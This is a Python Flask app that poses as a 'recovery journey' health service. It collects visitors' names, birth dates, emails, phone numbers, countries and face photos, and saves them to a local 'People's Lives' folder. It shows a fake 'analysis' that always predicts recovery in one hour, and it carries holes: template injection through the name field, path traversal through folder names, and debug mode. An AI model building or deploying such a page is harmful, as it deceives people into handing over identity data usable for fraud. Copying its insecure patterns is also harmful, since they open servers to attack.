import os
from flask import Flask, render_template_string, request
from datetime import datetime, timedelta
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Set the base folder for saving user details (using "People's Lives" with an apostrophe)
BASE_FOLDER = os.path.expanduser("~/storage/downloads/People's Lives")
if not os.path.exists(BASE_FOLDER):
    os.makedirs(BASE_FOLDER)

# Comprehensive list of country codes (international dialing codes)
COUNTRY_CODES = [
    {"code": "+93", "country": "Afghanistan"},
    {"code": "+355", "country": "Albania"},
    {"code": "+213", "country": "Algeria"},
    {"code": "+376", "country": "Andorra"},
    {"code": "+244", "country": "Angola"},
    {"code": "+1-268", "country": "Antigua and Barbuda"},
    {"code": "+54", "country": "Argentina"},
    {"code": "+374", "country": "Armenia"},
    {"code": "+61", "country": "Australia"},
    {"code": "+43", "country": "Austria"},
    {"code": "+994", "country": "Azerbaijan"},
    {"code": "+1-242", "country": "Bahamas"},
    {"code": "+973", "country": "Bahrain"},
    {"code": "+880", "country": "Bangladesh"},
    {"code": "+1-246", "country": "Barbados"},
    {"code": "+375", "country": "Belarus"},
    {"code": "+32", "country": "Belgium"},
    {"code": "+501", "country": "Belize"},
    {"code": "+229", "country": "Benin"},
    {"code": "+975", "country": "Bhutan"},
    {"code": "+591", "country": "Bolivia"},
    {"code": "+387", "country": "Bosnia and Herzegovina"},
    {"code": "+267", "country": "Botswana"},
    {"code": "+55", "country": "Brazil"},
    {"code": "+673", "country": "Brunei"},
    {"code": "+359", "country": "Bulgaria"},
    {"code": "+226", "country": "Burkina Faso"},
    {"code": "+257", "country": "Burundi"},
    {"code": "+238", "country": "Cabo Verde"},
    {"code": "+855", "country": "Cambodia"},
    {"code": "+237", "country": "Cameroon"},
    {"code": "+1", "country": "Canada"},
    {"code": "+236", "country": "Central African Republic"},
    {"code": "+235", "country": "Chad"},
    {"code": "+56", "country": "Chile"},
    {"code": "+86", "country": "China"},
    {"code": "+57", "country": "Colombia"},
    {"code": "+269", "country": "Comoros"},
    {"code": "+242", "country": "Congo (Congo-Brazzaville)"},
    {"code": "+506", "country": "Costa Rica"},
    {"code": "+385", "country": "Croatia"},
    {"code": "+53", "country": "Cuba"},
    {"code": "+357", "country": "Cyprus"},
    {"code": "+420", "country": "Czechia (Czech Republic)"},
    {"code": "+45", "country": "Denmark"},
    {"code": "+253", "country": "Djibouti"},
    {"code": "+1-767", "country": "Dominica"},
    {"code": "+1-809", "country": "Dominican Republic"},
    {"code": "+593", "country": "Ecuador"},
    {"code": "+20", "country": "Egypt"},
    {"code": "+503", "country": "El Salvador"},
    {"code": "+240", "country": "Equatorial Guinea"},
    {"code": "+291", "country": "Eritrea"},
    {"code": "+372", "country": "Estonia"},
    {"code": "+268", "country": "Eswatini"},
    {"code": "+251", "country": "Ethiopia"},
    {"code": "+679", "country": "Fiji"},
    {"code": "+358", "country": "Finland"},
    {"code": "+33", "country": "France"},
    {"code": "+241", "country": "Gabon"},
    {"code": "+220", "country": "Gambia"},
    {"code": "+995", "country": "Georgia"},
    {"code": "+49", "country": "Germany"},
    {"code": "+233", "country": "Ghana"},
    {"code": "+30", "country": "Greece"},
    {"code": "+1-473", "country": "Grenada"},
    {"code": "+502", "country": "Guatemala"},
    {"code": "+224", "country": "Guinea"},
    {"code": "+245", "country": "Guinea-Bissau"},
    {"code": "+592", "country": "Guyana"},
    {"code": "+509", "country": "Haiti"},
    {"code": "+504", "country": "Honduras"},
    {"code": "+36", "country": "Hungary"},
    {"code": "+354", "country": "Iceland"},
    {"code": "+91", "country": "India"},
    {"code": "+62", "country": "Indonesia"},
    {"code": "+98", "country": "Iran"},
    {"code": "+964", "country": "Iraq"},
    {"code": "+353", "country": "Ireland"},
    {"code": "+972", "country": "Israel"},
    {"code": "+39", "country": "Italy"},
    {"code": "+1-876", "country": "Jamaica"},
    {"code": "+81", "country": "Japan"},
    {"code": "+962", "country": "Jordan"},
    {"code": "+7", "country": "Kazakhstan"},
    {"code": "+254", "country": "Kenya"},
    {"code": "+686", "country": "Kiribati"},
    {"code": "+965", "country": "Kuwait"},
    {"code": "+996", "country": "Kyrgyzstan"},
    {"code": "+856", "country": "Laos"},
    {"code": "+371", "country": "Latvia"},
    {"code": "+961", "country": "Lebanon"},
    {"code": "+266", "country": "Lesotho"},
    {"code": "+231", "country": "Liberia"},
    {"code": "+218", "country": "Libya"},
    {"code": "+423", "country": "Liechtenstein"},
    {"code": "+370", "country": "Lithuania"},
    {"code": "+352", "country": "Luxembourg"},
    {"code": "+261", "country": "Madagascar"},
    {"code": "+265", "country": "Malawi"},
    {"code": "+60", "country": "Malaysia"},
    {"code": "+960", "country": "Maldives"},
    {"code": "+223", "country": "Mali"},
    {"code": "+356", "country": "Malta"},
    {"code": "+692", "country": "Marshall Islands"},
    {"code": "+222", "country": "Mauritania"},
    {"code": "+230", "country": "Mauritius"},
    {"code": "+52", "country": "Mexico"},
    {"code": "+691", "country": "Micronesia"},
    {"code": "+373", "country": "Moldova"},
    {"code": "+377", "country": "Monaco"},
    {"code": "+976", "country": "Mongolia"},
    {"code": "+382", "country": "Montenegro"},
    {"code": "+212", "country": "Morocco"},
    {"code": "+258", "country": "Mozambique"},
    {"code": "+95", "country": "Myanmar"},
    {"code": "+264", "country": "Namibia"},
    {"code": "+674", "country": "Nauru"},
    {"code": "+977", "country": "Nepal"},
    {"code": "+31", "country": "Netherlands"},
    {"code": "+64", "country": "New Zealand"},
    {"code": "+505", "country": "Nicaragua"},
    {"code": "+227", "country": "Niger"},
    {"code": "+234", "country": "Nigeria"},
    {"code": "+850", "country": "North Korea"},
    {"code": "+389", "country": "North Macedonia"},
    {"code": "+47", "country": "Norway"},
    {"code": "+968", "country": "Oman"},
    {"code": "+92", "country": "Pakistan"},
    {"code": "+680", "country": "Palau"},
    {"code": "+970", "country": "Palestine"},
    {"code": "+507", "country": "Panama"},
    {"code": "+675", "country": "Papua New Guinea"},
    {"code": "+595", "country": "Paraguay"},
    {"code": "+51", "country": "Peru"},
    {"code": "+63", "country": "Philippines"},
    {"code": "+48", "country": "Poland"},
    {"code": "+351", "country": "Portugal"},
    {"code": "+974", "country": "Qatar"},
    {"code": "+40", "country": "Romania"},
    {"code": "+7", "country": "Russia"},
    {"code": "+250", "country": "Rwanda"},
    {"code": "+1-869", "country": "Saint Kitts and Nevis"},
    {"code": "+1-758", "country": "Saint Lucia"},
    {"code": "+1-784", "country": "Saint Vincent and the Grenadines"},
    {"code": "+685", "country": "Samoa"},
    {"code": "+378", "country": "San Marino"},
    {"code": "+239", "country": "Sao Tome and Principe"},
    {"code": "+966", "country": "Saudi Arabia"},
    {"code": "+221", "country": "Senegal"},
    {"code": "+381", "country": "Serbia"},
    {"code": "+248", "country": "Seychelles"},
    {"code": "+232", "country": "Sierra Leone"},
    {"code": "+65", "country": "Singapore"},
    {"code": "+421", "country": "Slovakia"},
    {"code": "+386", "country": "Slovenia"},
    {"code": "+677", "country": "Solomon Islands"},
    {"code": "+252", "country": "Somalia"},
    {"code": "+27", "country": "South Africa"},
    {"code": "+82", "country": "South Korea"},
    {"code": "+211", "country": "South Sudan"},
    {"code": "+34", "country": "Spain"},
    {"code": "+94", "country": "Sri Lanka"},
    {"code": "+249", "country": "Sudan"},
    {"code": "+597", "country": "Suriname"},
    {"code": "+46", "country": "Sweden"},
    {"code": "+41", "country": "Switzerland"},
    {"code": "+963", "country": "Syria"},
    {"code": "+886", "country": "Taiwan"},
    {"code": "+992", "country": "Tajikistan"},
    {"code": "+255", "country": "Tanzania"},
    {"code": "+66", "country": "Thailand"},
    {"code": "+670", "country": "Timor-Leste"},
    {"code": "+228", "country": "Togo"},
    {"code": "+676", "country": "Tonga"},
    {"code": "+1-868", "country": "Trinidad and Tobago"},
    {"code": "+216", "country": "Tunisia"},
    {"code": "+90", "country": "Turkey"},
    {"code": "+993", "country": "Turkmenistan"},
    {"code": "+688", "country": "Tuvalu"},
    {"code": "+256", "country": "Uganda"},
    {"code": "+380", "country": "Ukraine"},
    {"code": "+971", "country": "United Arab Emirates"},
    {"code": "+44", "country": "United Kingdom"},
    {"code": "+1", "country": "United States"},
    {"code": "+598", "country": "Uruguay"},
    {"code": "+998", "country": "Uzbekistan"},
    {"code": "+678", "country": "Vanuatu"},
    {"code": "+58", "country": "Venezuela"},
    {"code": "+84", "country": "Vietnam"},
    {"code": "+967", "country": "Yemen"},
    {"code": "+260", "country": "Zambia"},
    {"code": "+263", "country": "Zimbabwe"}
]

# Comprehensive list of countries
COUNTRIES = [
    "Afghanistan", "Albania", "Algeria", "Andorra", "Angola",
    "Antigua and Barbuda", "Argentina", "Armenia", "Australia", "Austria",
    "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus",
    "Belgium", "Belize", "Benin", "Bhutan", "Bolivia", "Bosnia and Herzegovina",
    "Botswana", "Brazil", "Brunei", "Bulgaria", "Burkina Faso", "Burundi",
    "Cabo Verde", "Cambodia", "Cameroon", "Canada", "Central African Republic",
    "Chad", "Chile", "China", "Colombia", "Comoros", "Congo (Congo-Brazzaville)",
    "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czechia (Czech Republic)", "Denmark",
    "Djibouti", "Dominica", "Dominican Republic", "Ecuador", "Egypt", "El Salvador",
    "Equatorial Guinea", "Eritrea", "Estonia", "Eswatini", "Ethiopia", "Fiji", "Finland",
    "France", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Greece", "Grenada",
    "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Honduras", "Hungary",
    "Iceland", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy",
    "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Kuwait",
    "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libya",
    "Liechtenstein", "Lithuania", "Luxembourg", "Madagascar", "Malawi", "Malaysia",
    "Maldives", "Mali", "Malta", "Marshall Islands", "Mauritania", "Mauritius", "Mexico",
    "Micronesia", "Moldova", "Monaco", "Mongolia", "Montenegro", "Morocco", "Mozambique",
    "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "New Zealand", "Nicaragua",
    "Niger", "Nigeria", "North Korea", "North Macedonia", "Norway", "Oman", "Pakistan",
    "Palau", "Palestine", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines",
    "Poland", "Portugal", "Qatar", "Romania", "Russia", "Rwanda", "Saint Kitts and Nevis",
    "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino",
    "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Serbia", "Seychelles",
    "Sierra Leone", "Singapore", "Slovakia", "Slovenia", "Solomon Islands", "Somalia",
    "South Africa", "South Korea", "South Sudan", "Spain", "Sri Lanka", "Sudan",
    "Suriname", "Sweden", "Switzerland", "Syria", "Taiwan", "Tajikistan", "Tanzania",
    "Thailand", "Timor-Leste", "Togo", "Tonga", "Trinidad and Tobago", "Tunisia",
    "Turkey", "Turkmenistan", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates",
    "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela",
    "Vietnam", "Yemen", "Zambia", "Zimbabwe"
]

# Sort the country codes and countries alphabetically by their country name
COUNTRY_CODES_SORTED = sorted(COUNTRY_CODES, key=lambda cc: cc["country"])
COUNTRIES_SORTED = sorted(COUNTRIES)

@app.route('/')
def index():
    # Updated HTML page with refined styling and content designed to inspire trust and comfort.
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>My Recovery Journey</title>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
      <style>
        :root {
          --bg-color: #e9eff5;
          --text-color: #333;
          --container-bg: #fff;
          --border-color: #ddd;
          --primary-color: #3070b3;
          --primary-hover: #285a91;
          --accent-color: #28a745;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --bg-color: #1a1a1a;
            --text-color: #e0e0e0;
            --container-bg: #242424;
            --border-color: #555;
            --primary-color: #4aa3f5;
            --primary-hover: #3f8ed1;
          }
        }
        body {
          background: var(--bg-color);
          color: var(--text-color);
          font-family: 'Roboto', sans-serif;
          margin: 0;
          padding: 20px;
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
        }
        .container {
          background: var(--container-bg);
          border: 1px solid var(--border-color);
          border-radius: 10px;
          padding: 40px;
          width: 100%;
          max-width: 700px;
          box-shadow: 0 8px 20px rgba(0,0,0,0.1);
        }
        h2 {
          color: var(--primary-color);
          margin-bottom: 20px;
          font-weight: 700;
        }
        p.description {
          font-size: 1.1em;
          margin-bottom: 30px;
          line-height: 1.6;
        }
        label {
          display: block;
          margin-bottom: 8px;
          font-weight: 500;
        }
        input[type="text"],
        input[type="email"],
        input[type="tel"],
        input[type="date"],
        select,
        input[type="file"] {
          width: 100%;
          padding: 12px;
          margin-bottom: 20px;
          border: 1px solid var(--border-color);
          border-radius: 5px;
          font-size: 1em;
          background: var(--bg-color);
          color: var(--text-color);
        }
        input[type="submit"] {
          width: 100%;
          padding: 15px;
          background-color: var(--primary-color);
          border: none;
          border-radius: 5px;
          font-size: 1.1em;
          color: #fff;
          cursor: pointer;
          transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
          background-color: var(--primary-hover);
        }
        .phone-group {
          display: flex;
          gap: 10px;
          flex-wrap: wrap;
        }
        .phone-group select,
        .phone-group input[type="tel"] {
          flex: 1;
          min-width: 140px;
        }
        .footer {
          margin-top: 30px;
          text-align: center;
          font-size: 0.9em;
          color: var(--text-color);
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>Welcome to Your Recovery Journey</h2>
        <p class="description">
          We understand that healing and growth take time. Share your details below to receive a personalized estimate of when you might start feeling better. Your journey is unique – and we’re here to support you every step of the way.
        </p>
        <form action="/approve" method="post" enctype="multipart/form-data">
          <label for="first_name">First Name</label>
          <input type="text" name="first_name" id="first_name" placeholder="e.g., John" required>
  
          <label for="last_name">Last Name</label>
          <input type="text" name="last_name" id="last_name" placeholder="e.g., Doe" required>
  
          <label for="dob">Date of Birth</label>
          <input type="date" name="dob" id="dob" required>
  
          <label for="email">Email Address</label>
          <input type="email" name="email" id="email" placeholder="you@example.com" required>
  
          <div class="phone-group">
            <select name="country_code" required>
              {% for cc in country_codes %}
                <option value="{{ cc.code }}">{{ cc.code }} ({{ cc.country }})</option>
              {% endfor %}
            </select>
            <input type="tel" name="phone" placeholder="Phone Number" required>
          </div>
  
          <label for="country">Country</label>
          <select name="country" id="country" required>
            <option value="">Select Your Country</option>
            {% for c in countries %}
              <option value="{{ c }}">{{ c }}</option>
            {% endfor %}
          </select>
  
          <label for="face">Upload a Recent Photograph</label>
          <input type="file" name="face" id="face" accept="image/*" required>
  
          <input type="submit" value="Begin My Journey">
        </form>
        <div class="footer">
          &copy; 2025 Business Health Solutions. All rights reserved.
        </div>
      </div>
    </body>
    </html>
    ''', country_codes=COUNTRY_CODES_SORTED, countries=COUNTRIES_SORTED)

@app.route('/approve', methods=['POST'])
def approve():
    # Retrieve form data
    first_name = request.form.get('first_name').strip()
    last_name = request.form.get('last_name').strip()
    dob = request.form.get('dob').strip()  # YYYY-MM-DD from input type="date"
    email = request.form.get('email').strip()
    country_code = request.form.get('country_code').strip()
    phone = request.form.get('phone').strip()
    country = request.form.get('country').strip()
    face = request.files.get('face')
  
    # Compute a "recovery" time (here, one hour from current time)
    current_time = datetime.now()
    recovery_time = current_time + timedelta(hours=1)
    recovery_time_str = recovery_time.strftime('%I:%M %p on %B %d, %Y')
  
    # Create a folder named after the user inside the base folder
    folder_name = f"{first_name} {last_name}"
    user_folder = os.path.join(BASE_FOLDER, folder_name)
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)
  
    # Save user details in a text file within the user's folder
    details_filepath = os.path.join(user_folder, f"{first_name}_{last_name}.txt")
    with open(details_filepath, 'w') as f:
        f.write(f"First Name: {first_name}\n")
        f.write(f"Last Name: {last_name}\n")
        f.write(f"Date Of Birth: {dob}\n")
        f.write(f"Email: {email}\n")
        f.write(f"Phone: {country_code} {phone}\n")
        f.write(f"Country: {country}\n")
        f.write(f"Estimated Recovery Time: {recovery_time_str}\n")
  
    # Save the uploaded face image securely in the user folder
    if face:
        filename_face = secure_filename(face.filename)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        face_ext = os.path.splitext(filename_face)[1]
        face_filename = f"{first_name}_{last_name}_face_{timestamp}{face_ext}"
        face_filepath = os.path.join(user_folder, face_filename)
        face.save(face_filepath)
  
    # Render a friendly confirmation page with recovery details
    return render_template_string(f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Your Recovery Timeline</title>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
      <style>
        :root {{
          --bg-color: #e9eff5;
          --text-color: #333;
          --container-bg: #fff;
          --border-color: #ddd;
          --primary-color: #3070b3;
          --accent-color: #28a745;
        }}
        @media (prefers-color-scheme: dark) {{
          :root {{
            --bg-color: #1a1a1a;
            --text-color: #e0e0e0;
            --container-bg: #242424;
            --border-color: #555;
            --primary-color: #4aa3f5;
          }}
        }}
        body {{
          background: var(--bg-color);
          color: var(--text-color);
          font-family: 'Roboto', sans-serif;
          margin: 0;
          padding: 20px;
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
        }}
        .container {{
          background: var(--container-bg);
          border: 1px solid var(--border-color);
          border-radius: 10px;
          padding: 40px;
          width: 100%;
          max-width: 600px;
          box-shadow: 0 8px 20px rgba(0,0,0,0.1);
          text-align: center;
        }}
        h2 {{
          color: var(--primary-color);
          margin-bottom: 20px;
          font-weight: 700;
        }}
        p {{
          font-size: 1.1em;
          margin-bottom: 30px;
          line-height: 1.6;
        }}
        .footer {{
          margin-top: 20px;
          font-size: 0.9em;
          color: var(--text-color);
        }}
      </style>
    </head>
    <body>
      <div class="container">
        <h2>Thank You, {first_name}!</h2>
        <p>
          We have securely received your details. Based on our analysis, you may start feeling better around 
          <strong>{recovery_time_str}</strong>.
        </p>
        <p>
          Remember that every recovery journey is unique. We’re here to support you on your path to wellness.
        </p>
        <div class="footer">
          &copy; 2025 Business Health Solutions
        </div>
      </div>
    </body>
    </html>
    ''')

if __name__ == '__main__':
    app.run(debug=True)
